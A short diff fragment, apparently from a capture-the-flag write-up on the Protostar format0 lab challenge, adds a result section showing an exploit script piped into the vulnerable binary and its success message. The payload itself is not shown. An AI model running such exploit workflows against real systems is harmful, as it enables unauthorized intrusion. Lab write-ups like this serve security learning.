@@ -207,3 +207,9 @@ print(payload)
 
 # python exp.py | xargs ./fmt0
 ```
+### Result
+
+```
+root@protostar:/opt/protostar/bin# python exp.py | xargs ./format0
+you have hit the target correctly :)
+```
